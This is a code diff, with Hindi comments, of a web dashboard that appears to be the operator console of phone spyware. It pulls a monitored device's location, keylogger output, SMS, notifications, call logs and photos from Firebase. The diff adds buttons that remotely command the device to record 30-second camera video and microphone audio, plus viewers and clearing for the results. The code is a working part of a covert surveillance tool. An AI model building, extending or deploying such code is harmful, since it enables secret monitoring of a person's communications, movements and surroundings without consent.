                         contentHTML = `<div class="location-card" style="font-size: 1.1rem; line-height: 1.8;">
                                         <div style="display:flex; align-items:flex-start; gap:1rem; margin-bottom: 1.5rem;">
@@ -993,7 +1423,7 @@
                          contentHTML += '</div>';
                          break;
                     case 'calllogs':
-                        contentHTML = '<div class="sms-card-list">'; // Reusing SMS styles for consistency
+                        contentHTML = '<div class="sms-card-list">'; 
                         dataArray.forEach(call => {
                             if (call) {
                                 let icon, title, cardClass;
@@ -1015,13 +1445,17 @@
                                         cardClass = '';
                                         break;
                                 }
-                                contentHTML += `<div class="sms-card ${cardClass}"><div class="sms-card-header"><div class="sms-card-icon">${icon}</div><div class="sms-card-address">${title}</div></div><div class="sms-card-body"><strong>Number:</strong> ${call.phoneNumber || 'N/A'}<br><strong>Duration:</strong> ${call.duration || '0'}s</div><div class="sms-card-footer">${new Date(call.date).toLocaleString() || ''}</div></div>`;
+                                // बग फिक्स #3 का उपयोग: कॉल लॉग में सही समय दिखाने के लिए formatTimestamp() का उपयोग करें
+                                const callTime = formatTimestamp(call.date);
+                                contentHTML += `<div class="sms-card ${cardClass}"><div class="sms-card-header"><div class="sms-card-icon">${icon}</div><div class="sms-card-address">${title}</div></div><div class="sms-card-body"><strong>Number:</strong> ${call.phoneNumber || 'N/A'}<br><strong>Duration:</strong> ${call.duration || '0'}s</div><div class="sms-card-footer">${callTime}</div></div>`;
                             }
                         });
                         contentHTML += '</div>';
                         break;
                     case 'devicestatus':
                         const status = data;
+                        // बग फिक्स #3 का उपयोग: डिवाइस स्टेटस में सही समय दिखाने के लिए formatTimestamp() का उपयोग करें
+                        const lastUpdatedTime = formatTimestamp(status.lastUpdated);
                         contentHTML = `
                             <div class="data-card">
                                  <div class="sms-card-header" style="margin-bottom: 2rem;">
@@ -1063,7 +1497,7 @@
                                         </div>
                                     </div>
                                 </div>
-                                <div class="data-card-footer">Last updated: ${new Date(status.lastUpdated).toLocaleString() || 'N/A'}</div>
+                                <div class="data-card-footer">Last updated: ${lastUpdatedTime}</div>
                             </div>`;
                         break;
                  }
@@ -1071,7 +1505,6 @@
             modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
         }
         
-        // --- बेहतर और लचीला फंक्शन: डेटाबेस से तस्वीरें दिखाएं ---
         function renderPhotosFromDatabase(userId, childKey) {
             const headerHTML = `<div class="data-header"><button class="capture-photo-btn" data-facing="1"><span>Capture Front Photo</span></button><button class="capture-photo-btn" data-facing="0"><span>Capture Back Photo</span></button><button id="refresh-photos-btn"><span>Refresh</span></button><button class="clear-category-btn" data-category="photo"><span>Clear Photos</span></button></div>`;
             modalDataDisplayArea.innerHTML = headerHTML + '<div class="loader"></div>';
@@ -1085,7 +1518,6 @@
                     return;
                 }
 
-                // नवीनतम तस्वीरों को पहले दिखाने के लिए ऑब्जेक्ट मानों को उलट दें
                 const photosWithData = Object.values(photos).reverse();
 
                 if (photosWithData.length === 0) {
@@ -1095,10 +1527,9 @@
 
                 let photoGridHTML = '<div class="photo-grid">';
                 photosWithData.forEach(photoData => {
-                    // सुनिश्चित करें कि photoData एक ऑब्जेक्ट है और इसमें urlPhoto प्रॉपर्टी है
                     if (typeof photoData === 'object' && photoData !== null && photoData.urlPhoto) {
-                        const url = photoData.urlPhoto; // सही प्रॉपर्टी का उपयोग करें
-                        const timeCreated = photoData.dateTime || 'N/A'; // सही प्रॉपर्टी का उपयोग करें
+                        const url = photoData.urlPhoto; 
+                        const timeCreated = photoData.dateTime || 'N/A'; 
                         photoGridHTML += `<div class="photo-card"><img src="${url}" alt="Captured photo" onerror="this.onerror=null;this.src='https://placehold.co/200x180/2a2a2a/e0e0e0?text=Error';"><div class="photo-info"><span class="photo-time">${timeCreated}</span><a href="${url}" target="_blank" class="view-btn"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></a></div></div>`;
                     }
                 });
@@ -1106,16 +1537,107 @@
                 modalDataDisplayArea.innerHTML = headerHTML + photoGridHTML;
             };
 
-            // किसी भी पिछले लिसनर को हटाएं
             if (activeDataListener) {
                 off(activeDataListener.ref, 'value', activeDataListener.callback);
             }
 
-            // नया लिसनर संलग्न करें और उसे स्टोर करें
             onValue(photoDataRef, callback);
             activeDataListener = { ref: photoDataRef, callback: callback };
         }
+        
+        function renderVideosFromDatabase(userId, childKey) {
+            const headerHTML = `<div class="data-header">
+                                    <button class="record-btn" data-command="recordVideo" data-facing="1"><span>Record Front Video (30s)</span></button>
+                                    <button class="record-btn" data-command="recordVideo" data-facing="0"><span>Record Back Video (30s)</span></button>
+                                    <button class="record-btn" data-command="refresh" data-category="video" style="background-color: var(--accent-blue);"><span>Refresh</span></button>
+                                    <button class="clear-category-btn" data-category="video"><span>Clear Videos</span></button>
+                                </div>`;
+            modalDataDisplayArea.innerHTML = headerHTML + '<div class="loader"></div>';
 
+            const videoDataRef = ref(db, `user/${userId}/${childKey}/video/data`);
+            
+            const callback = (snapshot) => {
+                const videos = snapshot.val();
+                if (!videos || Object.keys(videos).length === 0) {
+                    modalDataDisplayArea.innerHTML = headerHTML + '<p>No videos available.</p>';
+                    return;
+                }
+
+                const videosWithData = Object.values(videos).reverse();
+                let videoGridHTML = '<div class="video-grid">';
+                videosWithData.forEach(videoData => {
+                    if (typeof videoData === 'object' && videoData !== null && videoData.videoUrl) {
+                        const url = videoData.videoUrl; 
+                        const timeCreated = videoData.dateTime || 'N/A'; 
+                        videoGridHTML += `<div class="video-card">
+                                            <video controls preload="metadata">
+                                                <source src="${url}" type="video/mp4">
+                                                Your browser does not support the video tag.
+                                            </video>
+                                            <div class="video-info">
+                                                <span class="video-time">${timeCreated}</span>
+                                                <a href="${url}" target="_blank" class="view-btn">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                                                </a>
+                                            </div>
+                                          </div>`;
+                    }
+                });
+                videoGridHTML += '</div>';
+                modalDataDisplayArea.innerHTML = headerHTML + videoGridHTML;
+            };
+
+            if (activeDataListener) {
+                off(activeDataListener.ref, 'value', activeDataListener.callback);
+            }
+
+            onValue(videoDataRef, callback);
+            activeDataListener = { ref: videoDataRef, callback: callback };
+        }
+
+        function renderAudiosFromDatabase(userId, childKey) {
+            const headerHTML = `<div class="data-header">
+                                    <button class="record-btn" data-command="recordAudio"><span>Record Audio (30s)</span></button>
+                                    <button class="record-btn" data-command="refresh" data-category="audio" style="background-color: var(--accent-blue);"><span>Refresh</span></button>
+                                    <button class="clear-category-btn" data-category="audio"><span>Clear Audios</span></button>
+                                </div>`;
+            modalDataDisplayArea.innerHTML = headerHTML + '<div class="loader"></div>';
+
+            const audioDataRef = ref(db, `user/${userId}/${childKey}/audio/data`);
+            
+            const callback = (snapshot) => {
+                const audios = snapshot.val();
+                if (!audios || Object.keys(audios).length === 0) {
+                    modalDataDisplayArea.innerHTML = headerHTML + '<p>No audio recordings available.</p>';
+                    return;
+                }
+
+                const audiosWithData = Object.values(audios).reverse();
+                let audioListHTML = '<div class="audio-list">';
+                audiosWithData.forEach(audioData => {
+                    if (typeof audioData === 'object' && audioData !== null && audioData.audioUrl) {
+                        const url = audioData.audioUrl;
+                        const timeCreated = audioData.dateTime || 'N/A';
+                        audioListHTML += `<div class="audio-card">
+                                            <audio controls preload="metadata">
+                                                <source src="${url}" type="audio/mpeg">
+                                                Your browser does not support the audio element.
+                                            </audio>
+                                            <div class="audio-time">${timeCreated}</div>
+                                          </div>`;
+                    }
+                });
+                audioListHTML += '</div>';
+                modalDataDisplayArea.innerHTML = headerHTML + audioListHTML;
+            };
+
+            if (activeDataListener) {
+                off(activeDataListener.ref, 'value', activeDataListener.callback);
+            }
+
+            onValue(audioDataRef, callback);
+            activeDataListener = { ref: audioDataRef, callback: callback };
+        }
 
         modalDataDisplayArea.addEventListener('click', (e) => {
             const button = e.target.closest('button');
@@ -1124,11 +1646,35 @@
             
             if (button.classList.contains('clear-category-btn')) {
                 const category = button.dataset.category;
+                
+                // =======================================================================
+                // ===== नया फीचर #4: 'Clear Command History' बटन के क्लिक को हैंडल करना =====
+                // यह सुनिश्चित करता है कि जब 'CommandHistory' के लिए बटन क्लिक हो, तो सही पाथ डिलीट हो।
+                // =======================================================================
+                if (category === 'CommandHistory') {
+                    if (confirm(`Are you sure you want to delete all Command History for '${userName}'? This cannot be undone.`)) {
+                         remove(ref(db, getCategoryPath(category, userId, childKey)))
+                            .then(() => alert(`Command History data cleared.`))
+                            .catch((err) => alert(`Error: ${err.message}`));
+                    }
+                    return; // फंक्शन को यहीं रोक दें ताकि आगे का कोड न चले।
+                }
+                // =======================================================================
+
                 if (confirm(`Are you sure you want to delete all ${category} data for '${userName}'? This cannot be undone.`)) {
                     if (category === 'photo') { 
                         clearAllPhotos(userId, childKey); 
-                    } else { 
-                        remove(ref(db, `user/${userId}/${childKey}/${getCategoryPath(category)}`))
+                    } else if (category === 'video') {
+                        remove(ref(db, getCategoryPath(category, userId, childKey)))
+                            .then(() => alert(`${category} data cleared.`))
+                            .catch((err) => alert(`Error: ${err.message}`));
+                    } else if (category === 'audio') {
+                        remove(ref(db, getCategoryPath(category, userId, childKey)))
+                            .then(() => alert(`${category} data cleared.`))
+                            .catch((err) => alert(`Error: ${err.message}`));
+                    } 
+                    else { 
+                        remove(ref(db, getCategoryPath(category, userId, childKey)))
                             .then(() => alert(`${category} data cleared.`))
                             .catch((err) => alert(`Error: ${err.message}`));
                     }
@@ -1154,43 +1700,86 @@
                         button.disabled = false; 
                     });
             }
+            
+            const command = button.dataset.command;
+            if(command === 'recordVideo') {
+                const facing = button.dataset.facing;
+                const paramsRef = ref(db, `user/${userId}/${childKey}/video/params`);
+                const span = button.querySelector('span');
+                const originalText = span.textContent;
+                button.disabled = true; span.textContent = 'Sending...';
+                
+                update(paramsRef, { recordVideo: true, duration: 30000, facing: parseInt(facing) })
+                    .then(() => { 
+                        span.textContent = 'Command Sent!'; 
+                        setTimeout(() => { span.textContent = originalText; button.disabled = false; }, 3000); 
+                    })
+                    .catch((error) => { 
+                        alert("Failed to send command."); 
+                        span.textContent = originalText; button.disabled = false; 
+                    });
+            }
+
+            if(command === 'recordAudio') {
+                const paramsRef = ref(db, `user/${userId}/${childKey}/audio/params`);
+                const span = button.querySelector('span');
+                const originalText = span.textContent;
+                button.disabled = true; span.textContent = 'Sending...';
+
+                update(paramsRef, { recordAudio: true, duration: 30000 })
+                    .then(() => { 
+                        span.textContent = 'Command Sent!'; 
+                        setTimeout(() => { span.textContent = originalText; button.disabled = false; }, 3000); 
+                    })
+                    .catch((error) => { 
+                        alert("Failed to send command."); 
+                        span.textContent = originalText; button.disabled = false; 
+                    });
+            }
+
+            if (command === 'refresh') {
+                 const category = button.dataset.category;
+                 if (category === 'video') renderVideosFromDatabase(userId, childKey);
+                 if (category === 'audio') renderAudiosFromDatabase(userId, childKey);
+            }
 
             if (button.id === 'refresh-photos-btn') { 
                 renderPhotosFromDatabase(userId, childKey); 
             }
         });
-
-        function getCategoryPath(category) {
+        
+        function getCategoryPath(category, userId, childKey) {
             switch(category) {
-                case 'location': return 'location/data';
-                case 'photo': return 'photo/data';
-                case 'keylogger': return 'keyLogger/data';
-                case 'sms': return 'sms/data';
-                case 'notifications': return 'notificationsMessages/data';
-                case 'calllogs': return 'Calls';
-                case 'devicestatus': return 'DeviceStatus';
-                default: return '';
+                case 'location': return `user/${userId}/${childKey}/location/data`;
+                case 'photo': return `user/${userId}/${childKey}/photo/data`;
+                case 'keylogger': return `user/${userId}/${childKey}/keyLogger/data`;
+                case 'sms': return `user/${userId}/${childKey}/sms/data`;
+                case 'notifications': return `user/${userId}/${childKey}/notificationsMessages/data`;
+                case 'calllogs': return `user/${userId}/${childKey}/Calls`;
+                case 'devicestatus': return `user/${userId}/${childKey}/DeviceStatus`;
+                case 'video': return `user/${userId}/${childKey}/video/data`;
+                case 'audio': return `user/${userId}/${childKey}/audio/data`;
+                case 'health': return `user/${userId}/${childKey}/AppHealthStatus`;
+                // =======================================================================
+                // ===== नया फीचर #4: 'CommandHistory' के लिए एक नया पाथ जोड़ना =====
+                // यह सुनिश्चित करता है कि जब हम कमांड हिस्ट्री डेटा को साफ़ करना चाहें, तो हमें सही Firebase पाथ मिले।
+                // =======================================================================
+                case 'CommandHistory': return `user/${userId}/${childKey}/CommandHistory`;
+                default: return `user/${userId}/${childKey}/${category}`;
             }
         }
         
-        // --- बेहतर क्लियर फंक्शन ---
         async function clearAllPhotos(userId, childKey) {
-            // पुष्टि (confirmation) इवेंट लिसनर में संभाली जाती है
             modalDataDisplayArea.innerHTML = '<div class="loader"></div><p>Deleting photo records...</p>';
             try {
-                // सिर्फ Realtime Database से फोटो के रिकॉर्ड्स हटाएं।
-                // renderPhotosFromDatabase का सक्रिय onValue लिसनर अपने आप UI को अपडेट कर देगा।
                 await remove(ref(db, `user/${userId}/${childKey}/photo/data`));
                 alert('All photo records have been deleted.');
             } catch (error) {
                 console.error("Error clearing photo records:", error);
                 alert("An error occurred while deleting photo records.");
-                // यदि डिलीट करने में कोई त्रुटि होती है तो उपयोगकर्ता को वर्तमान स्थिति दिखाने के लिए फिर से रेंडर करें।
                 renderPhotosFromDatabase(userId, childKey);
             }
         }
     </script>
 </body>
 </html>
-
-
